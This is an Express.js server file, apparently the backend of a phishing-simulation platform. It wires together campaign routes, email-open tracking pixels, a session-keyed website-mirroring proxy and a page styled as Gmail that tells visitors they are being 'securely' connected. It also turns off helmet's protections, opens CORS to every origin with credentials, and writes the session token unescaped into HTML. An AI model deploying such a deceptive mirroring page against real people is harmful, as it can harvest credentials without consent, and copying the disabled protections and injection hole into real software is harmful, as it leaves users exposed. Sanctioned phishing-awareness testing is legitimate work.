require('dotenv').config();
const express = require('express');
const helmet = require('helmet');
const cors = require('cors');
const morgan = require('morgan');
const path = require('path');
const config = require('./config');
const http = require('http');
const socketIo = require('socket.io');
const crypto = require('crypto');
const db = require('./database'); // Add database import
const landingPageService = require('./services/landingPageService');
const websiteMirroringService = require('./services/websiteMirroringService');

// Import routes
const campaignRoutes = require('./routes/campaignRoutes');
const authRoutes = require('./routes/authRoutes');
const templateRoutes = require('./routes/templateRoutes');
const landingPageRoutes = require('./routes/landingPageRoutes');
const profileRoutes = require('./routes/profileRoutes');
const userGroupRoutes = require('./routes/userGroupRoutes');
const userRoutes = require('./routes/userRoutes');
const utilityRoutes = require('./routes/utilityRoutes');
const aiScraperRoutes = require('./routes/aiScraperRoutes');
const { router: gmailBrowserRoutes, gmailBrowserController } = require('./routes/gmailBrowserRoutes');
const trackingService = require('./services/trackingService');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
    allowedHeaders: ["Content-Type", "Authorization"]
  }
});

// Serve static files from the public directory
app.use(express.static(path.join(__dirname, 'public')));

// Apply security, CORS, logging, and JSON parsing middleware
app.use(helmet({
  crossOriginResourcePolicy: { policy: "cross-origin" },
  // Disable HTTPS requirements and strict security policies
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginOpenerPolicy: false,
  crossOriginResourcePolicy: false,
  originAgentCluster: false,
  strictTransportSecurity: false
}));

// Configure CORS to be completely open
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS', 'HEAD', 'PATCH'],
  allowedHeaders: ['*'],
  credentials: true,
  maxAge: 86400 // 24 hours
}));
app.use(morgan('combined'));
app.use(express.json({ limit: '300mb' }));
app.use(express.urlencoded({ extended: true })); // For parsing form data


// Ensure OPTIONS requests return valid JSON to prevent empty response issues
app.options('*', (req, res) => {
  res.status(200).json({});
});

// Use routes
app.use('/api', campaignRoutes);
app.use('/api', authRoutes);
app.use('/api', templateRoutes);
app.use('/api', landingPageRoutes);
app.use('/api', profileRoutes);
app.use('/api', userGroupRoutes);
app.use('/api', userRoutes);
app.use('/api', utilityRoutes);
app.use('/api', aiScraperRoutes);
app.use('/api/gmail-browser', gmailBrowserRoutes);
app.use('/api/gmail-browser', gmailBrowserRoutes);

// Register landing page routes
landingPageService.registerLandingPageRoutes(app);

// Handle Gmail browser session routing
app.get('/gmail-browser/:sessionToken', async (req, res) => {
  const { sessionToken } = req.params;
  
  try {
    // Check if this is a valid Gmail browser session
    const sessionInfo = gmailBrowserController.gmailBrowserService.getSessionInfo(sessionToken);
    
    if (sessionInfo && sessionInfo.sessionType === 'gmail_browser') {
      // Create a Gmail browser session if it doesn't exist
      if (!sessionInfo.isActive) {
        await gmailBrowserController.gmailBrowserService.createGmailSession(
          sessionToken, 
          sessionInfo.campaignId,
          {
            ip: req.ip,
            userAgent: req.get('User-Agent'),
            timestamp: new Date()
          }
        );
      }

      // Render a page that shows the Gmail browser is active
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
          <meta charset="UTF-8">
          <meta name="viewport" content="width=device-width, initial-scale=1.0">
          <title>Gmail Access - Redirecting</title>
          <style>
            body {
              font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
              background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
              margin: 0;
              padding: 0;
              min-height: 100vh;
              display: flex;
              align-items: center;
              justify-content: center;
            }
            .container {
              background: white;
              padding: 2rem;
              border-radius: 12px;
              box-shadow: 0 20px 40px rgba(0,0,0,0.1);
              text-align: center;
              max-width: 400px;
              width: 90%;
            }
            .gmail-logo {
              width: 64px;
              height: 64px;
              margin: 0 auto 1rem;
              background: #ea4335;
              border-radius: 12px;
              display: flex;
              align-items: center;
              justify-content: center;
              color: white;
              font-size: 24px;
              font-weight: bold;
            }
            .spinner {
              border: 3px solid #f3f3f3;
              border-top: 3px solid #ea4335;
              border-radius: 50%;
              width: 30px;
              height: 30px;
              animation: spin 1s linear infinite;
              margin: 1rem auto;
            }
            @keyframes spin {
              0% { transform: rotate(0deg); }
              100% { transform: rotate(360deg); }
            }
            h1 { color: #333; margin-bottom: 0.5rem; }
            p { color: #666; margin-bottom: 1.5rem; }
            .secure-note {
              background: #f8f9fa;
              border-left: 4px solid #4285f4;
              padding: 1rem;
              margin-top: 1.5rem;
              text-align: left;
              border-radius: 0 4px 4px 0;
            }
            .secure-note strong { color: #4285f4; }
          </style>
        </head>
        <body>
          <div class="container">
            <div class="gmail-logo">G</div>
            <h1>Accessing Gmail</h1>
            <p>Please wait while we securely connect you to Gmail...</p>
            <div class="spinner"></div>
            <div class="secure-note">
              <strong>Secure Connection:</strong> Your connection is being processed through our secure gateway for enhanced protection.
            </div>
          </div>
          
          <script>
            // Show this page for 3 seconds, then trigger the browser session
            setTimeout(() => {
              // Send a request to create the browser session
              fetch('/api/gmail-browser/create-session', {
                method: 'POST',
                headers: {
                  'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                  sessionToken: '${sessionToken}',
                  campaignId: ${sessionInfo.campaignId}
                })
              }).then(response => response.json())
                .then(data => {
                  if (data.success) {
                    // Update the page to show browser session is active
                    document.body.innerHTML = \`
                      <div class="container">
                        <div class="gmail-logo">✓</div>
                        <h1>Gmail Browser Session Active</h1>
                        <p>Your Gmail session is now running in a secure browser environment.</p>
                        <p><strong>Session ID:</strong> ${sessionToken}</p>
                        <div class="secure-note">
                          <strong>Note:</strong> This session is being monitored by your organization's security team for training purposes.
                        </div>
                      </div>
                    \`;
                  }
                })
                .catch(error => {
                  console.error('Error creating browser session:', error);
                });
            }, 3000);
          </script>
        </body>
        </html>
      `);
    } else {
      res.status(404).send('Gmail browser session not found');
    }
  } catch (error) {
    console.error('Error handling Gmail browser route:', error);
    res.status(500).send('Internal server error');
  }
});

// Add a new endpoint to fetch the latest 'In Progress' campaign
app.get('/api/latest-campaign', async (req, res) => {
  try {
    const query = `SELECT * FROM campaigns WHERE status = 'In Progress' ORDER BY created_at DESC LIMIT 1`;
    const result = await db.get(query);

    if (result) {
      res.json(result);
    } else {
      res.status(404).json({ message: 'No campaign with status In Progress found.' });
    }
  } catch (error) {
    console.error('Error fetching latest campaign:', error);
    res.status(500).json({ message: 'Internal Server Error' });
  }
});

// Direct tracking endpoint
app.get('/track', (req, res) => {
  console.log('🔍 Direct tracking pixel requested:', req.query.email);
  // Extract campaign and user info from URL parameters if available
  const pixelId = crypto.randomUUID();
  trackingService.logOpen(pixelId, req, res, io);
});

// Multiple tracking pixel endpoints for better compatibility
app.get('/tracker/:id.png', (req, res) => {
  console.log('🔍 PNG Tracking pixel requested:', req.params.id);
  trackingService.logOpen(req.params.id, req, res, io);
});

app.get('/track/:id/pixel.gif', (req, res) => {
  console.log('🔍 GIF Tracking pixel requested:', req.params.id);
  trackingService.logOpen(req.params.id, req, res, io);
});

app.get('/t/:id/p.png', (req, res) => {
  console.log('🔍 Alternative tracking pixel requested:', req.params.id);
  trackingService.logOpen(req.params.id, req, res, io);
});

// Update schema to include email_client column if not exists
db.run(`
  ALTER TABLE open_logs 
  ADD COLUMN email_client TEXT DEFAULT 'Unknown'
`, (err) => {
  if (err && !err.message.includes('duplicate column')) {
    console.error('Error adding email_client column:', err);
  }
});

// Test tracking pixel endpoint - for testing only
app.get('/test-tracker/:id', (req, res) => {
  const pixelId = req.params.id;
  console.log('📝 Test tracking endpoint called for pixel:', pixelId);
  
  // Redirect to the actual tracking pixel
  res.redirect(`/tracker/${pixelId}.png`);
});

// CORS Proxy endpoint for handling cross-origin requests
app.all('/api/cors-proxy/:sessionToken', async (req, res) => {
  try {
    const sessionToken = req.params.sessionToken;
    console.log(`🌐 CORS proxy request for session: ${sessionToken}`);
    
    await websiteMirroringService.handleCrossOriginRequest(req, res, sessionToken);
  } catch (error) {
    console.error('Error in CORS proxy:', error);
    res.status(500).json({ error: 'CORS proxy failed' });
  }
});

// Handle preflight CORS requests
app.options('*', (req, res) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control, Pragma, X-Proxy-Target, X-Original-Host');
  res.header('Access-Control-Allow-Credentials', 'true');
  res.status(200).end();
});

// Website mirroring path-based route handler (must be before other routes)
app.use('/:sessionToken', async (req, res, next) => {
  // Check if this is a valid mirroring session token (32-char hex)
  const sessionToken = req.params.sessionToken;
  
  // Skip static resources and API paths
  if (req.path.startsWith('/api/') || 
      req.path.startsWith('/assets/') ||
      req.path.startsWith('/static/')) {
    return next();
  }
  
  if (sessionToken && /^[0-9a-f]{32}$/i.test(sessionToken)) {
    console.log(`Potential mirroring request detected: ${sessionToken}`);
    
    // Advanced error handling for mirroring
    try {
      return await websiteMirroringService.handleMirrorRequest(sessionToken, req, res);
    } catch (error) {
      console.error(`Error in mirroring handler: ${error.message}`);
      return res.status(500).send(`
        <html>
          <head>
            <title>Proxy Error</title>
            <style>body{font-family:sans-serif;max-width:600px;margin:40px auto;line-height:1.6}</style>
            <meta http-equiv="refresh" content="5;url=/${sessionToken}/">
          </head>
          <body>
            <h2>Error connecting to website</h2>
            <p>There was a problem connecting to the target website. Redirecting to homepage in 5 seconds...</p>
            <p><a href="/${sessionToken}/">Click here if you're not redirected automatically</a></p>
          </body>
        </html>
      `);
    }
  }
  
  next(); // Not a mirroring request, continue to other routes
});

// Socket.io connection handling
io.on('connection', (socket) => {
  console.log('New client connected', socket.id);
  
  socket.on('disconnect', () => {
    console.log('Client disconnected', socket.id);
  });
});

// Pass the Socket.IO instance to services that need real-time updates
websiteMirroringService.setSocketIO(io);
gmailBrowserController.setSocketIO(io);

app.get('/', (req, res) => {
  res.json({ status: 'Backend is running' });
});

// Catch-all for undefined routes - always returns JSON
app.use((req, res) => {
  res.status(404).json({ message: 'Not Found' });
});

// Global error handler for unexpected errors
app.use((err, req, res, next) => {
  console.error('Server error:', err);
  
  // In development, return the error details
  if (process.env.NODE_ENV !== 'production') {
    return res.status(500).json({ 
      message: 'Internal Server Error', 
      error: err.message,
      stack: err.stack 
    });
  }
  
  // In production, hide error details
  res.status(500).json({ message: 'Internal Server Error' });
});

// Start the server
const PORT = config.port;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`Server listening on http://0.0.0.0:${PORT}`);
  console.log(`Tracking URL: ${config.trackingUrl}/tracker/:id.png`);
});

// Handle server shutdown
process.on('SIGINT', async () => {
  console.log('Shutting down server...');
  
  process.exit(0);
});
